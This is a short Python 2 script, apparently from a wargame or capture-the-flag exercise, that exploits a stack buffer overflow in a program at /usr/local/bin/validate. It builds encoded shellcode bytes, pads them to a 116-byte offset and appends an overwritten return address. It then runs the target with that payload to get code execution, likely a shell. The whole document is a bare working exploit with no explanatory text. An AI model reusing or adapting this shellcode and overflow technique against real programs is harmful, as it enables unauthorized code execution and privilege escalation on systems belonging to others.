import os

def to_bytes(n, length, endianess='little'):
    h = '%x' % n
    s = ('0'*(len(h) % 2) + h).zfill(length*2).decode('hex')
    return s if endianess == 'big' else s[::-1]

buf =  ""
buf += "\xba\x4f\xc4\x9c\xf8\xda\xd6\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x0b\x83\xe8\xfc\x31\x50\x11\x03\x50\x11\xe2"
buf += "\xba\xae\x97\xa0\xdd\x7d\xce\x38\xf0\xe2\x87\x5e\x62"
buf += "\xca\xe4\xc8\x72\x7c\x24\x6b\x1b\x12\xb3\x88\x89\x02"
buf += "\xcb\x4e\x2d\xd3\xe3\x2c\x44\xbd\xd4\xc3\xfe\x41\x7c"
buf += "\x77\x77\xa0\x4f\xf7"


return_address = long(0x080484af)
return_address_offset = 116

shell_code = buf + \
             b'A' * (116 - len(buf)) + \
             bytearray(to_bytes(return_address, 4))

os.execv('/usr/local/bin/validate', ["/usr/local/bin/validate", str(shell_code)])



